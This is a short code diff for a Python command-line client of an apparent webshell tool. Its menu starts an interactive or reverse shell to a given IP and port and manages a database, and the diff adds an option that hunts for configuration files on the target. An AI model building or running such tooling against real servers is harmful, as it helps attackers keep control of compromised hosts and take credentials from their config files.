@@ -26,7 +26,8 @@ def main_help():
     print "        1. [sh|shell] : start an interactive shell"
     print "        2. [rsh|rshell] : start an reverse shell"
     print "        3. [db|database] : database manager"
-    print "        4. [q|quit|exit] : quit"
+    print "        4. [c|config] : find the config files"
+    print "        5. [q|quit|exit] : quit"
 
 def main():
     banner()
@@ -56,6 +57,9 @@ def main():
             port = raw_input("[PORT] : ") or "8888"
             Log.info("Starting reverse shell (%s:%s)" % (ip, port))
             webshell.reverse_shell(ip, port)
+        elif context == "c" or context == "config":
+            Log.info("Detacting config files...")
+            webshell.get_config_file()
         elif context == "db" or context == "database":
             ip = raw_input("IP (127.0.0.1): ") or "127.0.0.1"
             username = raw_input("Username (root): ") or "root"
